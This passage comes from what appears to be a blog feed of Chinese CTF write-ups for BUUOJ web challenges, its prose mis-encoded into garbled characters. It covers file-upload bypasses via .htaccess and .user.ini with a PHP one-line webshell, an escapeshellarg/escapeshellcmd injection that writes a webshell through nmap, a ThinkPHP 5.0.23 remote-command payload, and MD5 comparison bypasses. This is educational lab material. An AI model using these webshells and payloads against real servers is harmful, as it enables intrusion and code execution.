<p>é¦–å…ˆå°è¯•çš„æ˜¯ï¼Œå°†<code>Content-Type: image/jpeg</code>æ”¹ä¸ºå›¾ç‰‡ç±»å‹ï¼Œä½†æ˜¯è¿˜æ˜¯æ— æ³•ä¸Šä¼ </p>
<p>å†å°è¯•ä¸€ä¸‹.htaccessæ–‡ä»¶</p>
<p>æ–‡ä»¶å†…å®¹</p>
<div class="hljs"><pre><code class="hljs <FilesMatch">SetHandler application&#x2F;x-httpd-php
&lt;&#x2F;FilesMatch&gt;</code></pre></div>

<p><img src="/2020/10/08/buuoj-upload/1-2.png" srcset="/img/loading.gif" alt></p>
<p>ä¸Šä¼ æˆåŠŸåï¼Œå†ä¸Šä¼ åŒ…å«ä¸€å¥è¯æœ¨é©¬çš„ a.jpgæ–‡ä»¶ï¼Œ<code>.htaccess</code>æ–‡ä»¶çš„ä½œç”¨å°±æ˜¯å°†æŒ‡å®šç±»å‹çš„æ–‡ä»¶å½“ä½œphpæ–‡ä»¶è¿è¡Œ</p>
<p>æ‰€ä»¥è¡¨é¢ä¸Šæ˜¯jpgç±»å‹çš„æ–‡ä»¶ï¼Œä½†æ˜¯æ˜¯å½“ä½œphpæ–‡ä»¶</p>
<p><img src="/2020/10/08/buuoj-upload/1-1.png" srcset="/img/loading.gif" alt></p>
<p>ä¸Šä¼ æˆåŠŸåï¼Œèšå‰‘è®¿é—®<code>url+/upload/3af588e32ac72180588d18d5c3b470b4/a.jpg</code></p>
<p>å¯†ç ä¸ºï¼šcmd</p>
<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>è¯•ç€ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºéæ³•åç¼€åï¼Œç»§ç»­ä¿®æ”¹åç¼€åï¼Œå‘ç°php3,php5,phtmlç­‰å¯æ‰§è¡Œæ–‡ä»¶åä¸å¯ä¸Šä¼ </p>
<p>æƒ³åˆ°ä¸Šä¼ <code>.htacess</code>æ–‡ä»¶ï¼Œä½†æ˜¯ä¹Ÿæç¤ºäº†éæ³•åç¼€åï¼Œè¿™ä¸ªæ–¹æ³•è¡Œä¸é€šäº†</p>
<p><img src="/2020/10/08/buuoj-upload/2-4.png" srcset="/img/loading.gif" alt></p>
<p>ä½†æ˜¯ä¹‹å‰åšupload-labsä¸­è¿˜æœ‰ä¸€ä¸ªä¸Šä¼ <code>.user.ini</code>çš„æ–‡ä»¶</p>
<p><code>.user.ini</code>æ˜¯ä»€ä¹ˆ</p>
<blockquote>
<p>è¿™å¾—ä»php.iniè¯´èµ·äº†ã€‚php.iniæ˜¯phpé»˜è®¤çš„é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…æ‹¬äº†å¾ˆå¤šphpçš„é…ç½®ï¼Œè¿™äº›é…ç½®ä¸­ï¼Œåˆåˆ†ä¸ºå‡ ç§ï¼š<code>PHP_INI_SYSTEM</code>ã€<code>PHP_INI_PERDIR</code>ã€<code>PHP_INI_ALL</code>ã€<code>PHP_INI_USER</code>ã€‚</p>
</blockquote>
<p><code>.user.ini</code>çš„ä½œç”¨</p>
<blockquote>
<p>å¯ä»¥å€ŸåŠ©.user.iniè½»æ¾è®©<strong>æ‰€æœ‰</strong>phpæ–‡ä»¶éƒ½â€œè‡ªåŠ¨â€åŒ…å«æŸä¸ªæ–‡ä»¶ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶å¯ä»¥æ˜¯ä¸€ä¸ªæ­£å¸¸phpæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªåŒ…å«ä¸€å¥è¯çš„webshell</p>
</blockquote>
<p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">ä¼ é€é—¨</a></p>
<p><strong>å¼€å§‹åšé¢˜</strong></p>
<p>ä¸Šä¼ .user.iniæ–‡ä»¶</p>
<p><img src="/2020/10/08/buuoj-upload/2-1.png" srcset="/img/loading.gif" alt></p>
<p>GIF89aæ˜¯GIFæ–‡ä»¶å†…å®¹å¼€å¤´çš„å‡ ä¸ªå­—ç¬¦ï¼Œå…¶ä½œç”¨æ˜¯ä¸ºç±»ç»•è¿‡<code>exif_imagetype()</code></p>
<p>ä¸Šä¼ 1.gif</p>
<p><img src="/2020/10/08/buuoj-upload/2-2.png" srcset="/img/loading.gif" alt></p>
<p>æ–‡ä»¶ä¿å­˜çš„è·¯å¾„å·²ç»ç»™å‡ºï¼Œå¼€å§‹èšå‰‘é“¾æ¥çš„è¿æ¥æ˜¯</p>
<div class="hljs"><pre><code class="hljs angelscript">url/uploads/<span class="hljs-number">04</span>b0951938d905b41348c1548f9c338b/<span class="hljs-number">1.</span>gif</code></pre></div>

<p>ä½†æ˜¯ä¸€ç›´è¿æ¥ä¸ä¸Š</p>
<p>åæ¥é“¾æ¥index.phpæ‰è¿æ¥ä¸Šï¼Œè¿™é‡Œæƒ³åˆ°äº†<code>.user.ini</code>ä½œç”¨ï¼Œæ˜¯è®©æ‰€æœ‰çš„phpæ–‡ä»¶åŒ…å«æ•´ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œè€Œè¿™é‡Œæ–‡ä»¶è·¯å¾„å­˜åœ¨ä¸€ä¸ªindex.phpï¼Œæ‰€æœ‰è¯´index.phpä¸­ä¹Ÿå­˜åœ¨è¿™ä¸ªä¸€å¥è¯æœ¨é©¬</p>
<div class="hljs"><pre><code class="hljs llvm">/uploads/<span class="hljs-number">04</span>b<span class="hljs-number">0951938</span>d<span class="hljs-number">905</span>b<span class="hljs-number">41348</span><span class="hljs-keyword">c</span><span class="hljs-number">1548</span>f<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">338</span>b/index.php</code></pre></div>

<p><img src="/2020/10/08/buuoj-upload/2-3.png" srcset="/img/loading.gif" alt></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>.htacess</tag>
        <tag>.user.ini</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj-z7z8</title>
    <url>/2020/10/08/buuoj-z7z8/</url>
    <content><![CDATA[<h1 id="buuojâ€“æ‚ä¸ƒæ‚å…«"><a href="#buuojâ€“æ‚ä¸ƒæ‚å…«" class="headerlink" title="buuojâ€“æ‚ä¸ƒæ‚å…«"></a>buuojâ€“æ‚ä¸ƒæ‚å…«</h1><a id="more"></a>



<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;
  $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>];
&#125;

<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'host'</span>])) &#123;
  highlight_file(<span class="hljs-keyword">__FILE__</span>);
&#125; <span class="hljs-keyword">else</span> &#123;
  $host = $_GET[<span class="hljs-string">'host'</span>];
  $host = escapeshellarg($host);
  $host = escapeshellcmd($host);
  $sandbox = md5(<span class="hljs-string">"glzjin"</span>. $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>]);
  <span class="hljs-keyword">echo</span> <span class="hljs-string">'you are in sandbox '</span>.$sandbox;
  @mkdir($sandbox); <span class="hljs-comment">//åˆ›å»ºäº†è·¯å¾„</span>
  chdir($sandbox);
  <span class="hljs-keyword">echo</span> system(<span class="hljs-string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);
&#125;</code></pre></div>

<p>å‰é¢çš„ä¸¤æ®µä»£ç æ²¡å•¥ç”¨ï¼Œä¸»è¦æ˜¯åé¢å¤„ç† $hostçš„è¿‡ç¨‹</p>
<p><strong>1.çŸ¥è¯†å‚¨å¤‡</strong></p>
<blockquote>
<p><strong>escapeshellarg()</strong> å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æ˜¯ç¡®ä¿å®‰å…¨çš„ã€‚å¯¹äºç”¨æˆ·è¾“å…¥çš„éƒ¨åˆ†å‚æ•°å°±åº”è¯¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°ã€‚shell å‡½æ•°åŒ…å« <a href="https://www.php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">exec()</a>, <a href="https://www.php.net/manual/zh/function.system.php" target="_blank" rel="noopener">system()</a> <a href="https://www.php.net/manual/zh/language.operators.execution.php" target="_blank" rel="noopener">æ‰§è¡Œè¿ç®—ç¬¦</a> ã€‚</p>
</blockquote>
<blockquote>
<p><strong>escapeshellcmd()</strong> å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° <a href="https://www.php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">exec()</a> æˆ– <a href="https://www.php.net/manual/zh/function.system.php" target="_blank" rel="noopener">system()</a> å‡½æ•°ï¼Œæˆ–è€… <a href="https://www.php.net/manual/zh/language.operators.execution.php" target="_blank" rel="noopener">æ‰§è¡Œæ“ä½œç¬¦</a> ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚</p>
<p>åæ–œçº¿ï¼ˆ\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š <code>&amp;#;</code>|*?~&lt;&gt;^()[]{}$`, <code>\x0A</code> å’Œ <code>\xFF</code>ã€‚ <code>&#39;</code> å’Œ <code>&quot;</code> ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ <code>%</code> å’Œ <code>!</code> å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚</p>
</blockquote>
<p><strong>nampå‘½ä»¤</strong></p>
<blockquote>
<p><code>-T5</code> :æ‰«æç­‰çº§,è¶Šå¤§è¶Šå¿«,è¶Šå¿«è¶Šä¸å®‰å…¨,æœ€å¥½è®¾ç½®ä¸º<code>-T4</code><br><code>-sT</code> :TCP connent æ‰«æ,ä¸å¤ªå®‰å…¨(ç•™ä¸‹è®°å½•ä¿¡æ¯),è€Œä¸”é€Ÿåº¦è¾ƒæ…¢,ä¸€èˆ¬å…ˆä½¿ç”¨-sSæµ‹è¯•<br><code>-Pn</code> :ç¦ç”¨ping<br><code>-host-timeout 2</code>:è®¾ç½®æ‰«æä¸€å°ä¸»æœºçš„æ—¶é—´ï¼Œä»¥æ¯«ç§’ä¸ºå•ä½ã€‚<br><code>-F</code> :å¿«é€Ÿæ‰«ææ¨¡å¼ï¼Œåªæ‰«æåœ¨nmap-servicesæ–‡ä»¶ä¸­åˆ—å‡ºçš„ç«¯å£ã€‚</p>
</blockquote>
<p><strong>æ¼æ´ç‚¹åœ¨è¿™</strong></p>
<p>echo system(â€œnmap -T5 -sT -Pn â€“host-timeout 2 -F â€œ.$host);</p>
<p>è¿™æœ‰ä¸ªsystemæ¥æ‰§è¡Œå‘½ä»¤ï¼Œè€Œä¸”æœ‰ä¼ å‚ï¼Œè‚¯å®šæ˜¯åˆ©ç”¨è¿™é‡Œäº†</p>
<p><strong>2.æ„é€ payload</strong></p>
<blockquote>
<ol>
<li>ä¼ å…¥çš„å‚æ•°æ˜¯ï¼š<code>172.17.0.2&#39; -v -d a=1</code></li>
<li>ç»è¿‡<code>escapeshellarg</code>å¤„ç†åå˜æˆäº†<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>ï¼Œå³å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚</li>
<li>ç»è¿‡<code>escapeshellcmd</code>å¤„ç†åå˜æˆ<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>ï¼Œè¿™æ˜¯å› ä¸º<code>escapeshellcmd</code>å¯¹<code>\</code>ä»¥åŠæœ€åé‚£ä¸ª<strong>ä¸é…å¯¹å„¿</strong>çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰ï¼š<a href="http://php.net/manual/zh/function.escapeshellcmd.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.escapeshellcmd.php</a></li>
<li>æœ€åæ‰§è¡Œçš„å‘½ä»¤æ˜¯<code>curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>ï¼Œç”±äºä¸­é—´çš„<code>\\</code>è¢«è§£é‡Šä¸º<code>\</code>è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„<code>&#39;</code>æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„<code>&#39;</code>é…å¯¹å„¿æˆäº†ä¸€ä¸ªç©ºç™½è¿æ¥ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸º<code>curl 172.17.0.2\ -v -d a=1&#39;</code>ï¼Œå³å‘<code>172.17.0.2\</code>å‘èµ·è¯·æ±‚ï¼ŒPOST æ•°æ®ä¸º<code>a=1&#39;</code></li>
</ol>
</blockquote>
<p><strong>å›åˆ°<code>mail</code>ä¸­ï¼Œæˆ‘ä»¬çš„ payload æœ€ç»ˆåœ¨æ‰§è¡Œæ—¶å˜æˆäº†<code>&#39;-fa&#39;\\&#39;&#39;\( -OQueueDirectory=/tmp -X/var/www/html/test.php \)@a.com\&#39;</code>ï¼Œåˆ†å‰²åå°±æ˜¯<code>-fa\(</code>ã€<code>-OQueueDirectory=/tmp</code>ã€<code>-X/var/www/html/test.php</code>ã€<code>)@a.com&#39;</code>ï¼Œæœ€ç»ˆçš„å‚æ•°å°±æ˜¯è¿™æ ·è¢«æ³¨å…¥çš„ã€‚</strong></p>
<p><a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">å‚è€ƒ</a></p>
<p>éœ€è¦ç»•è¿‡ä¸Šé¢çš„ä¸¤ä¸ªå‡½æ•°ï¼Œå…ˆè¯•è¯•ä¸¤ä¸ªå‡½æ•°çš„ä½œç”¨</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$host = <span class="hljs-string">" 1'shellcode "</span>;
$host = escapeshellarg($host);
<span class="hljs-keyword">echo</span> $host;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"\n"</span>;
$host = escapeshellcmd($host);
<span class="hljs-keyword">echo</span> $host;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<div class="hljs"><pre><code class="hljs 1c">' 1'\''shellcode '
' <span class="hljs-number">1</span>'\\''shellcode \'</code></pre></div>

<p>æ„é€ çš„ä¸€å¥è¯æœ¨é©¬ä¸ºï¼š<code>&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code></p>
<p>è¿è¡Œç»“æœä¸ºï¼š<code>&#39; &#39;\\&#39;&#39;\&lt;\?php eval\(\)\;\?\&gt; -oG 1.php &#39;\\&#39;&#39; &#39;</code></p>
<p>è¿™é‡Œçš„å•å¼•å·éƒ½æ˜¯æˆå¯¹å‡ºç°çš„ï¼Œæ‰€ä»¥æ²¡å½±å“</p>
<p>payload:</p>
<div class="hljs"><pre><code class="hljs php">?host=<span class="hljs-string">' &lt;?php @eval($_POST["hack"]);?&gt; -oG hack.php '</span></code></pre></div>

<p><img src="/2020/10/08/buuoj-z7z8/online1.png" srcset="/img/loading.gif" alt></p>
<p>ä¸Šä¼ æ–‡ä»¶çš„ä¿å­˜è·¯å¾„ï¼Œåˆ©ç”¨èšå‰‘é“¾æ¥ä¸€ä¸‹</p>
<p><img src="/2020/10/08/buuoj-z7z8/online2.png" srcset="/img/loading.gif" alt></p>
<p>å‚è€ƒï¼š</p>
<p><a href="https://blog.csdn.net/qq_26406447/article/details/100711933" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/100711933</a></p>
<p><a href="https://blog.csdn.net/zhangxiansheng12/article/details/107216167?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/zhangxiansheng12/article/details/107216167?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase</a></p>
<p>(å†™çš„æœ‰ç‚¹ä¹±)</p>
<h2 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h2><p>æ‰“å¼€é¡µé¢å‡ºç°äº†æç¤º</p>
<p><img src="/2020/10/08/buuoj-z7z8/cve.png" srcset="/img/loading.gif" alt></p>
<p>è¿™é‡Œåº”è¯¥æ˜¯php5çš„æ¼æ´åˆ©ç”¨ï¼Œå’Œæ”»é˜²ä¸–ç•Œçš„ä¸€é“é¢˜æ¯”è¾ƒåƒ<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5412&page=1" target="_blank" rel="noopener">ä¼ é€é—¨</a></p>
<p>å…ˆçœ‹çœ‹æŠ¥é”™ä¿¡æ¯:1 <code>url+?s=1</code></p>
<p><img src="/2020/10/08/buuoj-z7z8/cve-1.png" srcset="/img/loading.gif" alt></p>
<p>phpç‰ˆæœ¬ä¸º5.0.23ï¼Œä¸Šç½‘æœäº†ä¸€ä¸‹è¿™ç‰ˆæœ¬çš„æ¼æ´</p>
<p><a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845</a></p>
<p>ç›´æ¥æ„é€ payloadï¼Œè¯»å–ç›®å½•</p>
<div class="hljs"><pre><code class="hljs url">url
POST:_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls &#x2F;</code></pre></div>

<p><img src="/2020/10/08/buuoj-z7z8/cve-2.png" srcset="/img/loading.gif" alt></p>
<p>çœ‹åˆ°äº†flagæ–‡ä»¶</p>
<p>è¯»å–flag</p>
<div class="hljs"><pre><code class="hljs dts">url
<span class="hljs-symbol">POST:</span>_method=__construct<span class="hljs-variable">&amp;filter</span>[]=system<span class="hljs-variable">&amp;server</span>[REQUEST_METHOD]=cat /flag</code></pre></div>

<p><img src="/2020/10/08/buuoj-z7z8/cve-3.png" srcset="/img/loading.gif" alt></p>
<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p><code>I put something in F12 for you</code></p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">'flag.php'</span>;
$flag=<span class="hljs-string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'gg'</span>])&amp;&amp;<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'id'</span>])) &#123;
	$id=$_GET[<span class="hljs-string">'id'</span>];
	$gg=$_GET[<span class="hljs-string">'gg'</span>];
	<span class="hljs-keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'You got the first step'</span>;
		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'passwd'</span>])) &#123;
			$passwd=$_POST[<span class="hljs-string">'passwd'</span>];
			<span class="hljs-keyword">if</span> (!is_numeric($passwd)) &#123;
				<span class="hljs-keyword">if</span>($passwd==<span class="hljs-number">1234567</span>) &#123;
					<span class="hljs-keyword">echo</span> <span class="hljs-string">'Good Job!'</span>;
					highlight_file(<span class="hljs-string">'flag.php'</span>);
					<span class="hljs-keyword">die</span>(<span class="hljs-string">'By Retr_0'</span>);
				&#125; <span class="hljs-keyword">else</span> &#123;
					<span class="hljs-keyword">echo</span> <span class="hljs-string">"can you think twice??"</span>;
				&#125;
			&#125; <span class="hljs-keyword">else</span> &#123;
				<span class="hljs-keyword">echo</span> <span class="hljs-string">'You can not get it !'</span>;
			&#125;
		&#125; <span class="hljs-keyword">else</span> &#123;
			<span class="hljs-keyword">die</span>(<span class="hljs-string">'only one way to get the flag'</span>);
		&#125;
	&#125; <span class="hljs-keyword">else</span> &#123;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"You are not a real hacker!"</span>;
	&#125;
&#125; <span class="hljs-keyword">else</span> &#123;
	<span class="hljs-keyword">die</span>(<span class="hljs-string">'Please input first'</span>);
&#125;
&#125;</code></pre></div>

<p>å…ˆF12æ‰¾ä¸€æ‰¾æç¤ºï¼ŒåŸæ¥å°±æ˜¯æ ¼å¼åŒ–å¥½çš„æºç </p>
<p><code>if (md5($id) === md5($gg) &amp;&amp; $id !== $gg)</code></p>
<p>ç›´æ¥ä½¿ç”¨æ•°ç»„ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨md5å¼ºç¢°æ’çš„ä¸¤å­—ç¬¦ä¸²</p>
<div class="hljs"><pre><code class="hljs llvm">param<span class="hljs-number">1</span>=M<span class="hljs-symbol">%C9h</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%0</span>E<span class="hljs-symbol">%E3</span><span class="hljs-symbol">%5</span>C<span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span>r<span class="hljs-symbol">%D4w</span><span class="hljs-symbol">%7</span>Br<span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%D3o</span><span class="hljs-symbol">%A7</span><span class="hljs-symbol">%B2</span><span class="hljs-symbol">%1</span>B<span class="hljs-symbol">%DCV</span><span class="hljs-symbol">%B7J</span><span class="hljs-symbol">%3</span>D<span class="hljs-symbol">%C0x</span><span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%7</span>B<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%AF</span><span class="hljs-symbol">%BF</span><span class="hljs-symbol">%A2</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%28</span>K<span class="hljs-symbol">%F3n</span><span class="hljs-symbol">%8</span>EKU<span class="hljs-symbol">%B3_Bu</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%D8Igm</span><span class="hljs-symbol">%A0</span><span class="hljs-symbol">%D1U</span><span class="hljs-symbol">%5</span>D<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%FB_</span><span class="hljs-symbol">%07</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%A2</span>
param<span class="hljs-number">2</span>=M<span class="hljs-symbol">%C9h</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%0</span>E<span class="hljs-symbol">%E3</span><span class="hljs-symbol">%5</span>C<span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span>r<span class="hljs-symbol">%D4w</span><span class="hljs-symbol">%7</span>Br<span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%D3o</span><span class="hljs-symbol">%A7</span><span class="hljs-symbol">%B2</span><span class="hljs-symbol">%1</span>B<span class="hljs-symbol">%DCV</span><span class="hljs-symbol">%B7J</span><span class="hljs-symbol">%3</span>D<span class="hljs-symbol">%C0x</span><span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%7</span>B<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%AF</span><span class="hljs-symbol">%BF</span><span class="hljs-symbol">%A2</span><span class="hljs-symbol">%02</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%28</span>K<span class="hljs-symbol">%F3n</span><span class="hljs-symbol">%8</span>EKU<span class="hljs-symbol">%B3_Bu</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%D8Igm</span><span class="hljs-symbol">%A0</span><span class="hljs-symbol">%D1</span><span class="hljs-symbol">%D5</span><span class="hljs-symbol">%5</span>D<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%FB_</span><span class="hljs-symbol">%07</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%A2</span></code></pre></div>

<p><code>if (!is_numeric($passwd))</code>å¼±ç±»å‹æ¯”è¾ƒï¼Œä½¿ç”¨1234567aç»•è¿‡</p>
<p>payload:</p>
<div class="hljs"><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=M<span class="hljs-meta">%C9h</span><span class="hljs-meta">%FF</span><span class="hljs-meta">%0E</span><span class="hljs-meta">%E3</span><span class="hljs-meta">%5C</span><span class="hljs-meta">%20</span><span class="hljs-meta">%95r</span><span class="hljs-meta">%D4w</span><span class="hljs-meta">%7Br</span><span class="hljs-meta">%15</span><span class="hljs-meta">%87</span><span class="hljs-meta">%D3o</span><span class="hljs-meta">%A7</span><span class="hljs-meta">%B2</span><span class="hljs-meta">%1B</span><span class="hljs-meta">%DCV</span><span class="hljs-meta">%B7J</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%C0x</span><span class="hljs-meta">%3E</span><span class="hljs-meta">%7B</span><span class="hljs-meta">%95</span><span class="hljs-meta">%18</span><span class="hljs-meta">%AF</span><span class="hljs-meta">%BF</span><span class="hljs-meta">%A2</span><span class="hljs-meta">%00</span><span class="hljs-meta">%A8</span><span class="hljs-meta">%28K</span><span class="hljs-meta">%F3n</span><span class="hljs-meta">%8EKU</span><span class="hljs-meta">%B3_Bu</span><span class="hljs-meta">%93</span><span class="hljs-meta">%D8Igm</span><span class="hljs-meta">%A0</span><span class="hljs-meta">%D1U</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%83</span><span class="hljs-meta">%60</span><span class="hljs-meta">%FB_</span><span class="hljs-meta">%07</span><span class="hljs-meta">%FE</span><span class="hljs-meta">%A2</span>&amp;gg=M<span class="hljs-meta">%C9h</span><span class="hljs-meta">%FF</span><span class="hljs-meta">%0E</span><span class="hljs-meta">%E3</span><span class="hljs-meta">%5C</span><span class="hljs-meta">%20</span><span class="hljs-meta">%95r</span><span class="hljs-meta">%D4w</span><span class="hljs-meta">%7Br</span><span class="hljs-meta">%15</span><span class="hljs-meta">%87</span><span class="hljs-meta">%D3o</span><span class="hljs-meta">%A7</span><span class="hljs-meta">%B2</span><span class="hljs-meta">%1B</span><span class="hljs-meta">%DCV</span><span class="hljs-meta">%B7J</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%C0x</span><span class="hljs-meta">%3E</span><span class="hljs-meta">%7B</span><span class="hljs-meta">%95</span><span class="hljs-meta">%18</span><span class="hljs-meta">%AF</span><span class="hljs-meta">%BF</span><span class="hljs-meta">%A2</span><span class="hljs-meta">%02</span><span class="hljs-meta">%A8</span><span class="hljs-meta">%28K</span><span class="hljs-meta">%F3n</span><span class="hljs-meta">%8EKU</span><span class="hljs-meta">%B3_Bu</span><span class="hljs-meta">%93</span><span class="hljs-meta">%D8Igm</span><span class="hljs-meta">%A0</span><span class="hljs-meta">%D1</span><span class="hljs-meta">%D5</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%83</span><span class="hljs-meta">%60</span><span class="hljs-meta">%FB_</span><span class="hljs-meta">%07</span><span class="hljs-meta">%FE</span><span class="hljs-meta">%A2</span>

POST:passwd=<span class="hljs-number">1234567</span>a

æˆ–è€…
<span class="hljs-built_in">?id</span>[]=<span class="hljs-number">1</span>&amp;gg[]=<span class="hljs-number">2</span>

POST:passwd=<span class="hljs-number">1234567</span>a</code></pre></div>





<h2 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h2><p>urlä¸­åŒ…å«<code>/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code>ï¼Œä»”ç»†çœ‹<code>TXpVek5UTTFNbVUzTURabE5qYz0</code>å…¶å®æ˜¯base64ç¼–ç ï¼Œè§£ç è¿˜æ˜¯base64ï¼Œç»§ç»­è§£ç ä¸ºä¸€ä¸²åå…­è¿›åˆ¶çš„å­—ç¬¦ï¼Œå†…å®¹ä¸º555.png</p>
